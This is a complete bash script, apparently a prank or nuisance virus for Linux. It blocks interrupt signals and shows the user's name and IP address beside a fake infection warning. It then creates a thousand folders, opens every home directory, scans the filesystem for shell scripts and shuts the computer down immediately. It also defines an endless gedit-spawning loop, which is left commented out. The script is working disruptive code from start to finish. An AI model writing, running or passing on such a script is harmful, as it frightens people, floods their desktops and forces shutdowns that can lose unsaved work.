#!/bin/bash

#ignore interrupt signals
interrupts(){
	trap '' INT
	trap '' TSTP
}

#call function
interrupts




user_info(){
user=$(whoami)
ip=$(hostname -I)
date=$(date +%y-%m-%d)

echo "Loading .... "
sleep 1
echo "Loading .... "
sleep 2
echo "System Information..."
sleep 3
echo " User_Name : $user"
echo " Ip_Address: $ip"
echo " Date      : $date"
sleep 2
echo "WARNING_..             your computer is just infected by VIRUS" 
}

#function call
user_info



#making folders
mkdir newfolder{1..1000}


#opening all directories from home and so on ..
open_all_dir(){
directories=$(find "$HOME" -type d)

for dir in $directories; do
	if [[ -d "$dir" ]]; then
	xdg-open "$dir" >/dev/null 2>&1
	fi
done
}


#call the func
open_all_dir


#finding all .sh extension
find / -type f -name '*.sh'


#open notepad
notepad(){

while true;do
gedit >/dev/null 2>&1 &
done

}

#call func
#notepad


#shudowning the pc
shutdown -h now

